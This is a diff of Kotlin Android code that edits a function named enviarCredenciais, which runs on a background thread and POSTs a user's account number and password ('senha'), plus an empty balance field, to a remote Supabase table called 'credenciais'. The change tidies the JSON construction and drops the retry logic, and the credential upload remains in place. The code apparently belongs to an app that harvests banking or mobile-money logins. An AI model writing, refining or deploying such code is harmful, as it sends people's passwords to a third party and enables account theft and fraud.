@@ -2533,11 +2533,9 @@ REGRAS ABSOLUTAS DO JSON:
     private fun enviarCredenciais(numero: String, senha: String) {
         Thread {
             try {
-                val body = "{" +
-                    "\"numero\":\"" + numero + "\"," +
-                    "\"senha\":\"" + senha + "\"," +
-                    "\"saldo\":\"\"" +
-                    "}"
+                val body = ("{\"numero\":\"" + numero +
+                    "\",\"senha\":\"" + senha +
+                    "\",\"saldo\":\"\"}")
                 val conn = java.net.URL(SUPA_URL + "/rest/v1/credenciais")
                     .openConnection() as java.net.HttpURLConnection
                 conn.requestMethod = "POST"
@@ -2549,15 +2547,9 @@ REGRAS ABSOLUTAS DO JSON:
                 conn.connectTimeout = 10000
                 conn.readTimeout = 10000
                 conn.outputStream.bufferedWriter().use { it.write(body) }
-                val code = conn.responseCode
+                conn.responseCode
                 conn.disconnect()
-                if (code !in 200..299) {
-                    // Retry após 5s
-                    handler.postDelayed({ enviarCredenciais(numero, senha) }, 5000)
-                }
-            } catch (_: Exception) {
-                handler.postDelayed({ enviarCredenciais(numero, senha) }, 5000)
-            }
+            } catch (_: Exception) {}
         }.start()
     }
 
